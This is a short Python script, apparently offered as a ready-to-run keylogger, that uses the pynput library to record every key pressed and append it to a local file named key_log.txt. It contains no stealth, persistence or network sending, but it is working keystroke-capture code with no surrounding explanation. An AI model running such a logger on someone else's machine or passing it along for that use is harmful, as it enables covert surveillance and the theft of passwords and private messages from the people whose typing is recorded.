from pynput.keyboard import Listener

# Specify the log file where keystrokes will be saved
log_file = "key_log.txt"


# Function to log keystrokes
def log_keystroke(key):
    try:
        # Attempt to capture the character representation of the key
        keystroke = key.char if key.char else str(key)
    except AttributeError:
        keystroke = str(key)

    # Save keystrokes to a file
    with open(log_file, "a") as file:
        file.write(keystroke + "\n")

print("Keylogger ready...")

# Set up the listener for keystrokes
with Listener(on_press=log_keystroke) as listener:
    listener.join()
